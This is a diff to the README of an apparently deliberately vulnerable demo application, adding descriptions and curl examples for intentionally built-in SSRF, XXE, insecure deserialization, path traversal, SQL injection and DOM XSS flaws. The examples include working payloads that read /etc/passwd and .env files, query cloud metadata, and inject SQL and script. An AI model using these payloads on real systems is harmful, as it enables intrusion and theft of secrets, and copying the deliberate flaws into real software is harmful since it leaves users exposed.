@@ -1231,3 +1231,127 @@ Full configuration & usage examples can be found in our [demo project](https://g
   ![Insecure Output Handling Demonstration](docs/insecure_output_handling.gif)
 
   </details>
+
+- **Server-Side Request Forgery (SSRF) - New Endpoint** - The `/api/fetch` endpoint accepts a `url` query parameter and fetches its content without proper validation. This allows attackers to make the server request internal services, cloud metadata endpoints, or other sensitive resources.
+  <details>
+    <summary>Example Exploitation of /api/fetch SSRF</summary>
+
+  To demonstrate SSRF via the new endpoint:
+
+  ```bash
+  # Fetch external URL
+  curl 'https://brokencrystals.com/api/fetch?url=https://example.com'
+
+  # Access cloud metadata (AWS)
+  curl 'https://brokencrystals.com/api/fetch?url=http://169.254.169.254/latest/meta-data/'
+
+  # Access internal network
+  curl 'https://brokencrystals.com/api/fetch?url=http://internal-server:8080/admin'
+  ```
+
+  </details>
+
+- **XML External Entity (XXE) - File Upload** - The `/api/upload/parse` endpoint accepts XML file uploads and parses them with an insecurely configured XML parser that allows external entity processing.
+  <details>
+    <summary>Example Exploitation of XXE</summary>
+
+  To demonstrate XXE via file upload:
+
+  ```bash
+  # Create malicious XML file with external entity
+  cat > exploit.xml << 'EOF'
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <root>
+    <data>&xxe;</data>
+  </root>
+  EOF
+
+  # Upload the malicious XML file
+  curl -X POST 'https://brokencrystals.com/api/upload/parse' \
+    -F 'file=@exploit.xml'
+  ```
+
+  </details>
+
+- **Insecure Deserialization** - The `/api/serialize` endpoint accepts JSON data and processes it using insecure patterns that could lead to code execution in certain contexts.
+  <details>
+    <summary>Example Exploitation of Insecure Deserialization</summary>
+
+  To demonstrate insecure deserialization:
+
+  ```bash
+  # Send serialized data that gets evaluated
+  curl -X POST 'https://brokencrystals.com/api/serialize' \
+    -H 'Content-Type: application/json' \
+    -d '{"data": "{ \"test\": \"value\" }"}'
+
+  # Try with object containing constructor properties
+  curl -X POST 'https://brokencrystals.com/api/serialize' \
+    -H 'Content-Type: application/json' \
+    -d '{"data": "{ \"__proto__\": { \"isAdmin\": true }}"}'
+  ```
+
+  </details>
+
+- **Path Traversal** - The `/api/file/read` endpoint allows reading arbitrary files from the filesystem without validating path traversal sequences.
+  <details>
+    <summary>Example Exploitation of Path Traversal</summary>
+
+  To demonstrate path traversal:
+
+  ```bash
+  # Read /etc/passwd
+  curl 'https://brokencrystals.com/api/file/read?path=../../etc/passwd'
+
+  # Read application configuration
+  curl 'https://brokencrystals.com/api/file/read?path=../../usr/src/app/.env'
+
+  # Read other sensitive files
+  curl 'https://brokencrystals.com/api/file/read?path=../../etc/hosts'
+  ```
+
+  </details>
+
+- **ORM Injection** - The `/api/testimonials/search` endpoint uses raw string interpolation in TypeORM queries instead of parameterized queries, making it vulnerable to SQL injection.
+  <details>
+    <summary>Example Exploitation of ORM Injection</summary>
+
+  To demonstrate ORM injection:
+
+  ```bash
+  # Basic injection
+  curl 'https://brokencrystals.com/api/testimonials/search?query=test'
+
+  # SQL injection to extract all data
+  curl 'https://brokencrystals.com/api/testimonials/search?query=%27%20OR%20%271%27=%271'
+
+  # Extract database version
+  curl 'https://brokencrystals.com/api/testimonials/search?query=%27%3BSELECT%20version()--'
+  ```
+
+  </details>
+
+- **DOM-based XSS** - The `/search` page in the React frontend reflects user input into innerHTML without sanitization, allowing arbitrary JavaScript execution.
+  <details>
+    <summary>Example Exploitation of DOM-based XSS</summary>
+
+  To demonstrate DOM-based XSS:
+
+  1. Navigate to `/search`
+  2. Enter the following payload in the search box:
+     ```javascript
+     <img src=x onerror=alert('XSS')>
+     ```
+  3. Click Search - the payload will be reflected directly into the DOM
+
+  Alternative exploitation:
+
+  ```bash
+  # The search results are also rendered via dangerouslySetInnerHTML
+  curl 'http://localhost:3000/search?query=<script>alert(1)</script>'
+  ```
+
+  </details>
